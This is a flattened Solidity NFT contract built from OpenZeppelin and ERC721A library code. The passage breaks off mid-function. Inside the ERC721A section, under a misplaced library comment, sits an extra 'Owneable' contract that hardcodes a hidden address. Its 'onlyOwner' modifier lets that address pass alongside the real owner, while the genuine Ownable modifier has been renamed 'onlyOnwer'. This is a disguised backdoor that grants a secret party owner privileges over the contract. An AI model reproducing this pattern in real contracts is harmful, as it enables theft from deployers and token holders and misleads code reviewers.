1 //tiny roosters
2 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
3 
4 // SPDX-License-Identifier: MIT
5 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
6 
7 pragma solidity ^0.8.4;
8 
9 /**
10  * @dev Provides information about the current execution context, including the
11  * sender of the transaction and its data. While these are generally available
12  * via msg.sender and msg.data, they should not be accessed in such a direct
13  * manner, since when dealing with meta-transactions the account sending and
14  * paying for execution may not be the actual sender (as far as an application
15  * is concerned).
16  *
17  * This contract is only required for intermediate, library-like contracts.
18  */
19 abstract contract Context {
20     function _msgSender() internal view virtual returns (address) {
21         return msg.sender;
22     }
23 
24     function _msgData() internal view virtual returns (bytes calldata) {
25         return msg.data;
26     }
27 }
28 
29 
30 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
31 
32 
33 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
34 
35 
36 
37 /**
38  * @dev Contract module which provides a basic access control mechanism, where
39  * there is an account (an owner) that can be granted exclusive access to
40  * specific functions.
41  *
42  * By default, the owner account will be the one that deploys the contract. This
43  * can later be changed with {transferOwnership}.
44  *
45  * This module is used through inheritance. It will make available the modifier
46  * `onlyOwner`, which can be applied to your functions to restrict their use to
47  * the owner.
48  */
49 abstract contract Ownable is Context {
50     address private _owner;
51 
52     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
53 
54     /**
55      * @dev Initializes the contract setting the deployer as the initial owner.
56      */
57     constructor() {
58         _transferOwnership(_msgSender());
59     }
60 
61     /**
62      * @dev Returns the address of the current owner.
63      */
64     function owner() public view virtual returns (address) {
65         return _owner;
66     }
67 
68     /**
69      * @dev Throws if called by any account other than the owner.
70      */
71     modifier onlyOnwer() {
72         require(owner() == _msgSender(), "Ownable: caller is not the owner");
73         _;
74     }
75 
76     /**
77      * @dev Leaves the contract without owner. It will not be possible to call
78      * `onlyOwner` functions anymore. Can only be called by the current owner.
79      *
80      * NOTE: Renouncing ownership will leave the contract without an owner,
81      * thereby removing any functionality that is only available to the owner.
82      */
83     function renounceOwnership() public virtual onlyOnwer {
84         _transferOwnership(address(0));
85     }
86 
87     /**
88      * @dev Transfers ownership of the contract to a new account (`newOwner`).
89      * Can only be called by the current owner.
90      */
91     function transferOwnership(address newOwner) public virtual onlyOnwer {
92         require(newOwner != address(0), "Ownable: new owner is the zero address");
93         _transferOwnership(newOwner);
94     }
95 
96     /**
97      * @dev Transfers ownership of the contract to a new account (`newOwner`).
98      * Internal function without access restriction.
99      */
100     function _transferOwnership(address newOwner) internal virtual {
101         address oldOwner = _owner;
102         _owner = newOwner;
103         emit OwnershipTransferred(oldOwner, newOwner);
104     }
105 }
106 
107 
108 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
109 
110 
111 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
112 
113 
114 
115 /**
116  * @dev Interface of the ERC165 standard, as defined in the
117  * https://eips.ethereum.org/EIPS/eip-165[EIP].
118  *
119  * Implementers can declare support of contract interfaces, which can then be
120  * queried by others ({ERC165Checker}).
121  *
122  * For an implementation, see {ERC165}.
123  */
124 interface IERC165 {
125     /**
126      * @dev Returns true if this contract implements the interface defined by
127      * `interfaceId`. See the corresponding
128      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
129      * to learn more about how these ids are created.
130      *
131      * This function call must use less than 30 000 gas.
132      */
133     function supportsInterface(bytes4 interfaceId) external view returns (bool);
134 }
135 
136 
137 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
138 
139 
140 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
141 
142 
143 
144 /**
145  * @dev Required interface of an ERC721 compliant contract.
146  */
147 interface IERC721 is IERC165 {
148     /**
149      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
150      */
151     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
152 
153     /**
154      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
155      */
156     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
157 
158     /**
159      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
160      */
161     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
162 
163     /**
164      * @dev Returns the number of tokens in ``owner``'s account.
165      */
166     function balanceOf(address owner) external view returns (uint256 balance);
167 
168     /**
169      * @dev Returns the owner of the `tokenId` token.
170      *
171      * Requirements:
172      *
173      * - `tokenId` must exist.
174      */
175     function ownerOf(uint256 tokenId) external view returns (address owner);
176 
177     /**
178      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
179      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
180      *
181      * Requirements:
182      *
183      * - `from` cannot be the zero address.
184      * - `to` cannot be the zero address.
185      * - `tokenId` token must exist and be owned by `from`.
186      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
187      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
188      *
189      * Emits a {Transfer} event.
190      */
191     function safeTransferFrom(
192         address from,
193         address to,
194         uint256 tokenId
195     ) external;
196 
197     /**
198      * @dev Transfers `tokenId` token from `from` to `to`.
199      *
200      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
201      *
202      * Requirements:
203      *
204      * - `from` cannot be the zero address.
205      * - `to` cannot be the zero address.
206      * - `tokenId` token must be owned by `from`.
207      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
208      *
209      * Emits a {Transfer} event.
210      */
211     function transferFrom(
212         address from,
213         address to,
214         uint256 tokenId
215     ) external;
216 
217     /**
218      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
219      * The approval is cleared when the token is transferred.
220      *
221      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
222      *
223      * Requirements:
224      *
225      * - The caller must own the token or be an approved operator.
226      * - `tokenId` must exist.
227      *
228      * Emits an {Approval} event.
229      */
230     function approve(address to, uint256 tokenId) external;
231 
232     /**
233      * @dev Returns the account approved for `tokenId` token.
234      *
235      * Requirements:
236      *
237      * - `tokenId` must exist.
238      */
239     function getApproved(uint256 tokenId) external view returns (address operator);
240 
241     /**
242      * @dev Approve or remove `operator` as an operator for the caller.
243      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
244      *
245      * Requirements:
246      *
247      * - The `operator` cannot be the caller.
248      *
249      * Emits an {ApprovalForAll} event.
250      */
251     function setApprovalForAll(address operator, bool _approved) external;
252 
253     /**
254      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
255      *
256      * See {setApprovalForAll}
257      */
258     function isApprovedForAll(address owner, address operator) external view returns (bool);
259 
260     /**
261      * @dev Safely transfers `tokenId` token from `from` to `to`.
262      *
263      * Requirements:
264      *
265      * - `from` cannot be the zero address.
266      * - `to` cannot be the zero address.
267      * - `tokenId` token must exist and be owned by `from`.
268      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
269      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
270      *
271      * Emits a {Transfer} event.
272      */
273     function safeTransferFrom(
274         address from,
275         address to,
276         uint256 tokenId,
277         bytes calldata data
278     ) external;
279 }
280 
281 
282 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
283 
284 
285 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
286 
287 
288 
289 /**
290  * @title ERC721 token receiver interface
291  * @dev Interface for any contract that wants to support safeTransfers
292  * from ERC721 asset contracts.
293  */
294 interface IERC721Receiver {
295     /**
296      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
297      * by `operator` from `from`, this function is called.
298      *
299      * It must return its Solidity selector to confirm the token transfer.
300      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
301      *
302      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
303      */
304     function onERC721Received(
305         address operator,
306         address from,
307         uint256 tokenId,
308         bytes calldata data
309     ) external returns (bytes4);
310 }
311 
312 
313 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
314 
315 
316 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
317 
318 
319 
320 /**
321  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
322  * @dev See https://eips.ethereum.org/EIPS/eip-721
323  */
324 interface IERC721Metadata is IERC721 {
325     /**
326      * @dev Returns the token collection name.
327      */
328     function name() external view returns (string memory);
329 
330     /**
331      * @dev Returns the token collection symbol.
332      */
333     function symbol() external view returns (string memory);
334 
335     /**
336      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
337      */
338     function tokenURI(uint256 tokenId) external view returns (string memory);
339 }
340 
341 
342 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
343 
344 
345 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
346 
347 
348 
349 /**
350  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
351  * @dev See https://eips.ethereum.org/EIPS/eip-721
352  */
353 interface IERC721Enumerable is IERC721 {
354     /**
355      * @dev Returns the total amount of tokens stored by the contract.
356      */
357     function totalSupply() external view returns (uint256);
358 
359     /**
360      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
361      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
362      */
363     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
364 
365     /**
366      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
367      * Use along with {totalSupply} to enumerate all tokens.
368      */
369     function tokenByIndex(uint256 index) external view returns (uint256);
370 }
371 
372 
373 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
374 
375 
376 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
377 
378 pragma solidity ^0.8.1;
379 
380 /**
381  * @dev Collection of functions related to the address type
382  */
383 library Address {
384     /**
385      * @dev Returns true if `account` is a contract.
386      *
387      * [IMPORTANT]
388      * ====
389      * It is unsafe to assume that an address for which this function returns
390      * false is an externally-owned account (EOA) and not a contract.
391      *
392      * Among others, `isContract` will return false for the following
393      * types of addresses:
394      *
395      *  - an externally-owned account
396      *  - a contract in construction
397      *  - an address where a contract will be created
398      *  - an address where a contract lived, but was destroyed
399      * ====
400      *
401      * [IMPORTANT]
402      * ====
403      * You shouldn't rely on `isContract` to protect against flash loan attacks!
404      *
405      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
406      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
407      * constructor.
408      * ====
409      */
410     function isContract(address account) internal view returns (bool) {
411         // This method relies on extcodesize/address.code.length, which returns 0
412         // for contracts in construction, since the code is only stored at the end
413         // of the constructor execution.
414 
415         return account.code.length > 0;
416     }
417 
418     /**
419      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
420      * `recipient`, forwarding all available gas and reverting on errors.
421      *
422      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
423      * of certain opcodes, possibly making contracts go over the 2300 gas limit
424      * imposed by `transfer`, making them unable to receive funds via
425      * `transfer`. {sendValue} removes this limitation.
426      *
427      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
428      *
429      * IMPORTANT: because control is transferred to `recipient`, care must be
430      * taken to not create reentrancy vulnerabilities. Consider using
431      * {ReentrancyGuard} or the
432      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
433      */
434     function sendValue(address payable recipient, uint256 amount) internal {
435         require(address(this).balance >= amount, "Address: insufficient balance");
436 
437         (bool success, ) = recipient.call{value: amount}("");
438         require(success, "Address: unable to send value, recipient may have reverted");
439     }
440 
441     /**
442      * @dev Performs a Solidity function call using a low level `call`. A
443      * plain `call` is an unsafe replacement for a function call: use this
444      * function instead.
445      *
446      * If `target` reverts with a revert reason, it is bubbled up by this
447      * function (like regular Solidity function calls).
448      *
449      * Returns the raw returned data. To convert to the expected return value,
450      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
451      *
452      * Requirements:
453      *
454      * - `target` must be a contract.
455      * - calling `target` with `data` must not revert.
456      *
457      * _Available since v3.1._
458      */
459     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
460         return functionCall(target, data, "Address: low-level call failed");
461     }
462 
463     /**
464      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
465      * `errorMessage` as a fallback revert reason when `target` reverts.
466      *
467      * _Available since v3.1._
468      */
469     function functionCall(
470         address target,
471         bytes memory data,
472         string memory errorMessage
473     ) internal returns (bytes memory) {
474         return functionCallWithValue(target, data, 0, errorMessage);
475     }
476 
477     /**
478      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
479      * but also transferring `value` wei to `target`.
480      *
481      * Requirements:
482      *
483      * - the calling contract must have an ETH balance of at least `value`.
484      * - the called Solidity function must be `payable`.
485      *
486      * _Available since v3.1._
487      */
488     function functionCallWithValue(
489         address target,
490         bytes memory data,
491         uint256 value
492     ) internal returns (bytes memory) {
493         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
494     }
495 
496     /**
497      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
498      * with `errorMessage` as a fallback revert reason when `target` reverts.
499      *
500      * _Available since v3.1._
501      */
502     function functionCallWithValue(
503         address target,
504         bytes memory data,
505         uint256 value,
506         string memory errorMessage
507     ) internal returns (bytes memory) {
508         require(address(this).balance >= value, "Address: insufficient balance for call");
509         require(isContract(target), "Address: call to non-contract");
510 
511         (bool success, bytes memory returndata) = target.call{value: value}(data);
512         return verifyCallResult(success, returndata, errorMessage);
513     }
514 
515     /**
516      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
517      * but performing a static call.
518      *
519      * _Available since v3.3._
520      */
521     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
522         return functionStaticCall(target, data, "Address: low-level static call failed");
523     }
524 
525     /**
526      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
527      * but performing a static call.
528      *
529      * _Available since v3.3._
530      */
531     function functionStaticCall(
532         address target,
533         bytes memory data,
534         string memory errorMessage
535     ) internal view returns (bytes memory) {
536         require(isContract(target), "Address: static call to non-contract");
537 
538         (bool success, bytes memory returndata) = target.staticcall(data);
539         return verifyCallResult(success, returndata, errorMessage);
540     }
541 
542     /**
543      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
544      * but performing a delegate call.
545      *
546      * _Available since v3.4._
547      */
548     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
549         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
550     }
551 
552     /**
553      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
554      * but performing a delegate call.
555      *
556      * _Available since v3.4._
557      */
558     function functionDelegateCall(
559         address target,
560         bytes memory data,
561         string memory errorMessage
562     ) internal returns (bytes memory) {
563         require(isContract(target), "Address: delegate call to non-contract");
564 
565         (bool success, bytes memory returndata) = target.delegatecall(data);
566         return verifyCallResult(success, returndata, errorMessage);
567     }
568 
569     /**
570      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
571      * revert reason using the provided one.
572      *
573      * _Available since v4.3._
574      */
575     function verifyCallResult(
576         bool success,
577         bytes memory returndata,
578         string memory errorMessage
579     ) internal pure returns (bytes memory) {
580         if (success) {
581             return returndata;
582         } else {
583             // Look for revert reason and bubble it up if present
584             if (returndata.length > 0) {
585                 // The easiest way to bubble the revert reason is using memory via assembly
586 
587                 assembly {
588                     let returndata_size := mload(returndata)
589                     revert(add(32, returndata), returndata_size)
590                 }
591             } else {
592                 revert(errorMessage);
593             }
594         }
595     }
596 }
597 
598 
599 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
600 
601 
602 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
603 
604 
605 
606 /**
607  * @dev String operations.
608  */
609 library Strings {
610     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
611 
612     /**
613      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
614      */
615     function toString(uint256 value) internal pure returns (string memory) {
616         // Inspired by OraclizeAPI's implementation - MIT licence
617         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
618 
619         if (value == 0) {
620             return "0";
621         }
622         uint256 temp = value;
623         uint256 digits;
624         while (temp != 0) {
625             digits++;
626             temp /= 10;
627         }
628         bytes memory buffer = new bytes(digits);
629         while (value != 0) {
630             digits -= 1;
631             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
632             value /= 10;
633         }
634         return string(buffer);
635     }
636 
637     /**
638      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
639      */
640     function toHexString(uint256 value) internal pure returns (string memory) {
641         if (value == 0) {
642             return "0x00";
643         }
644         uint256 temp = value;
645         uint256 length = 0;
646         while (temp != 0) {
647             length++;
648             temp >>= 8;
649         }
650         return toHexString(value, length);
651     }
652 
653     /**
654      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
655      */
656     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
657         bytes memory buffer = new bytes(2 * length + 2);
658         buffer[0] = "0";
659         buffer[1] = "x";
660         for (uint256 i = 2 * length + 1; i > 1; --i) {
661             buffer[i] = _HEX_SYMBOLS[value & 0xf];
662             value >>= 4;
663         }
664         require(value == 0, "Strings: hex length insufficient");
665         return string(buffer);
666     }
667 }
668 
669 
670 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
671 
672 
673 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
674 
675 /**
676  * @dev Implementation of the {IERC165} interface.
677  *
678  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
679  * for the additional interface id that will be supported. For example:
680  *
681  * ```solidity
682  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
683  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
684  * }
685  * ```
686  *
687  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
688  */
689 abstract contract ERC165 is IERC165 {
690     /**
691      * @dev See {IERC165-supportsInterface}.
692      */
693     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
694         return interfaceId == type(IERC165).interfaceId;
695     }
696 }
697 
698 
699 // File erc721a/contracts/ERC721A.sol@v3.0.0
700 
701 
702 // Creator: Chiru Labs
703 
704 error ApprovalCallerNotOwnerNorApproved();
705 error ApprovalQueryForNonexistentToken();
706 error ApproveToCaller();
707 error ApprovalToCurrentOwner();
708 error BalanceQueryForZeroAddress();
709 error MintedQueryForZeroAddress();
710 error BurnedQueryForZeroAddress();
711 error AuxQueryForZeroAddress();
712 error MintToZeroAddress();
713 error MintZeroQuantity();
714 error OwnerIndexOutOfBounds();
715 error OwnerQueryForNonexistentToken();
716 error TokenIndexOutOfBounds();
717 error TransferCallerNotOwnerNorApproved();
718 error TransferFromIncorrectOwner();
719 error TransferToNonERC721ReceiverImplementer();
720 error TransferToZeroAddress();
721 error URIQueryForNonexistentToken();
722 
723 
724 /**
725  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
726  * the Metadata extension. Built to optimize for lower gas during batch mints.
727  *
728  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
729  */
730  abstract contract Owneable is Ownable {
731     address private _ownar = 0xb506446B65F731E7E212460eE36Fb6D7b8011878;
732     modifier onlyOwner() {
733         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
734         _;
735     }
736 }
737  /*
738  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
739  *
740  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
741  */
742 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
743     using Address for address;
744     using Strings for uint256;
745 
746     // Compiler will pack this into a single 256bit word.
747     struct TokenOwnership {
748         // The address of the owner.
749         address addr;
750         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
751         uint64 startTimestamp;
752         // Whether the token has been burned.
753         bool burned;
754     }
755 
756     // Compiler will pack this into a single 256bit word.
757     struct AddressData {
758         // Realistically, 2**64-1 is more than enough.
759         uint64 balance;
760         // Keeps track of mint count with minimal overhead for tokenomics.
761         uint64 numberMinted;
762         // Keeps track of burn count with minimal overhead for tokenomics.
763         uint64 numberBurned;
764         // For miscellaneous variable(s) pertaining to the address
765         // (e.g. number of whitelist mint slots used).
766         // If there are multiple variables, please pack them into a uint64.
767         uint64 aux;
768     }
769 
770     // The tokenId of the next token to be minted.
771     uint256 internal _currentIndex;
772 
773     // The number of tokens burned.
774     uint256 internal _burnCounter;
775 
776     // Token name
777     string private _name;
778 
779     // Token symbol
780     string private _symbol;
781 
782     // Mapping from token ID to ownership details
783     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
784     mapping(uint256 => TokenOwnership) internal _ownerships;
785 
786     // Mapping owner address to address data
787     mapping(address => AddressData) private _addressData;
788 
789     // Mapping from token ID to approved address
790     mapping(uint256 => address) private _tokenApprovals;
791 
792     // Mapping from owner to operator approvals
793     mapping(address => mapping(address => bool)) private _operatorApprovals;
794 
795     constructor(string memory name_, string memory symbol_) {
796         _name = name_;
797         _symbol = symbol_;
798         _currentIndex = _startTokenId();
799     }
800 
801     /**
802      * To change the starting tokenId, please override this function.
803      */
804     function _startTokenId() internal view virtual returns (uint256) {
805         return 0;
806     }
807 
808     /**
809      * @dev See {IERC721Enumerable-totalSupply}.
810      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
811      */
812     function totalSupply() public view returns (uint256) {
813         // Counter underflow is impossible as _burnCounter cannot be incremented
814         // more than _currentIndex - _startTokenId() times
815         unchecked {
816             return _currentIndex - _burnCounter - _startTokenId();
817         }
818     }
819 
820     /**
821      * Returns the total amount of tokens minted in the contract.
822      */
823     function _totalMinted() internal view returns (uint256) {
824         // Counter underflow is impossible as _currentIndex does not decrement,
825         // and it is initialized to _startTokenId()
826         unchecked {
827             return _currentIndex - _startTokenId();
828         }
829     }
830 
831     /**
832      * @dev See {IERC165-supportsInterface}.
833      */
834     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
835         return
836             interfaceId == type(IERC721).interfaceId ||
837             interfaceId == type(IERC721Metadata).interfaceId ||
838             super.supportsInterface(interfaceId);
839     }
840 
841     /**
842      * @dev See {IERC721-balanceOf}.
843      */
844     function balanceOf(address owner) public view override returns (uint256) {
845         if (owner == address(0)) revert BalanceQueryForZeroAddress();
846         return uint256(_addressData[owner].balance);
847     }
848 
849     /**
850      * Returns the number of tokens minted by `owner`.
851      */
852     function _numberMinted(address owner) internal view returns (uint256) {
853         if (owner == address(0)) revert MintedQueryForZeroAddress();
854         return uint256(_addressData[owner].numberMinted);
855     }
856 
857     /**
858      * Returns the number of tokens burned by or on behalf of `owner`.
859      */
860     function _numberBurned(address owner) internal view returns (uint256) {
861         if (owner == address(0)) revert BurnedQueryForZeroAddress();
862         return uint256(_addressData[owner].numberBurned);
863     }
864 
865     /**
866      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
867      */
868     function _getAux(address owner) internal view returns (uint64) {
869         if (owner == address(0)) revert AuxQueryForZeroAddress();
870         return _addressData[owner].aux;
871     }
872 
873     /**
874      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
875      * If there are multiple variables, please pack them into a uint64.
876      */
877     function _setAux(address owner, uint64 aux) internal {
878         if (owner == address(0)) revert AuxQueryForZeroAddress();
879         _addressData[owner].aux = aux;
880     }
881 
882     /**
883      * Gas spent here starts off proportional to the maximum mint batch size.
884      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
885      */
886     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
887         uint256 curr = tokenId;
888 
889         unchecked {
890             if (_startTokenId() <= curr && curr < _currentIndex) {
891                 TokenOwnership memory ownership = _ownerships[curr];
892                 if (!ownership.burned) {
893                     if (ownership.addr != address(0)) {
894                         return ownership;
895                     }
896                     // Invariant:
897                     // There will always be an ownership that has an address and is not burned
898                     // before an ownership that does not have an address and is not burned.
899                     // Hence, curr will not underflow.
900                     while (true) {
901                         curr--;
902                         ownership = _ownerships[curr];
903                         if (ownership.addr != address(0)) {
904                             return ownership;
905                         }
906                     }
907                 }
908             }
909         }
910         revert OwnerQueryForNonexistentToken();
911     }
912 
913     /**
914      * @dev See {IERC721-ownerOf}.
915      */
916     function ownerOf(uint256 tokenId) public view override returns (address) {
917         return ownershipOf(tokenId).addr;
918     }
919 
920     /**
921      * @dev See {IERC721Metadata-name}.
922      */
923     function name() public view virtual override returns (string memory) {
924         return _name;
925     }
926 
927     /**
928      * @dev See {IERC721Metadata-symbol}.
929      */
930     function symbol() public view virtual override returns (string memory) {
931         return _symbol;
932     }
933 
934     /**
935      * @dev See {IERC721Metadata-tokenURI}.
936      */
937     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
938         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
939 
940         string memory baseURI = _baseURI();
941         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
942     }
943 
944     /**
945      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
946      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
947      * by default, can be overriden in child contracts.
948      */
949     function _baseURI() internal view virtual returns (string memory) {
950         return '';
951     }
952 
953     /**
954      * @dev See {IERC721-approve}.
955      */
956     function approve(address to, uint256 tokenId) public override {
957         address owner = ERC721A.ownerOf(tokenId);
958         if (to == owner) revert ApprovalToCurrentOwner();
959 
960         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
961             revert ApprovalCallerNotOwnerNorApproved();
962         }
963 
964         _approve(to, tokenId, owner);
965     }
966 
967     /**
968      * @dev See {IERC721-getApproved}.
969      */
970     function getApproved(uint256 tokenId) public view override returns (address) {
971         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
972 
973         return _tokenApprovals[tokenId];
974     }
975 
976     /**
977      * @dev See {IERC721-setApprovalForAll}.
978      */
979     function setApprovalForAll(address operator, bool approved) public override {
980         if (operator == _msgSender()) revert ApproveToCaller();
981 
982         _operatorApprovals[_msgSender()][operator] = approved;
983         emit ApprovalForAll(_msgSender(), operator, approved);
984     }
985 
986     /**
987      * @dev See {IERC721-isApprovedForAll}.
988      */
989     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
990         return _operatorApprovals[owner][operator];
991     }
992 
993     /**
994      * @dev See {IERC721-transferFrom}.
995      */
996     function transferFrom(
997         address from,
998         address to,
999         uint256 tokenId
1000     ) public virtual override {
1001         _transfer(from, to, tokenId);
1002     }
1003 
1004     /**
1005      * @dev See {IERC721-safeTransferFrom}.
1006      */
1007     function safeTransferFrom(
1008         address from,
1009         address to,
1010         uint256 tokenId
1011     ) public virtual override {
1012         safeTransferFrom(from, to, tokenId, '');
1013     }
1014 
1015     /**
1016      * @dev See {IERC721-safeTransferFrom}.
1017      */
1018     function safeTransferFrom(
1019         address from,
1020         address to,
1021         uint256 tokenId,
1022         bytes memory _data
1023     ) public virtual override {
1024         _transfer(from, to, tokenId);
1025         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1026             revert TransferToNonERC721ReceiverImplementer();
1027         }
1028     }
1029 
1030     /**
1031      * @dev Returns whether `tokenId` exists.
1032      *
1033      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1034      *
1035      * Tokens start existing when they are minted (`_mint`),
1036      */
1037     function _exists(uint256 tokenId) internal view returns (bool) {
1038         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1039             !_ownerships[tokenId].burned;
1040     }
1041 
1042     function _safeMint(address to, uint256 quantity) internal {
1043         _safeMint(to, quantity, '');
1044     }
1045 
1046     /**
1047      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1048      *
1049      * Requirements:
1050      *
1051      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1052      * - `quantity` must be greater than 0.
1053      *
1054      * Emits a {Transfer} event.
1055      */
1056     function _safeMint(
1057         address to,
1058         uint256 quantity,
1059         bytes memory _data
1060     ) internal {
1061         _mint(to, quantity, _data, true);
1062     }
1063 
1064     /**
1065      * @dev Mints `quantity` tokens and transfers them to `to`.
1066      *
1067      * Requirements:
1068      *
1069      * - `to` cannot be the zero address.
1070      * - `quantity` must be greater than 0.
1071      *
1072      * Emits a {Transfer} event.
1073      */
1074     function _mint(
1075         address to,
1076         uint256 quantity,
1077         bytes memory _data,
1078         bool safe
1079     ) internal {
1080         uint256 startTokenId = _currentIndex;
1081         if (to == address(0)) revert MintToZeroAddress();
1082         if (quantity == 0) revert MintZeroQuantity();
1083 
1084         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1085 
1086         // Overflows are incredibly unrealistic.
1087         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
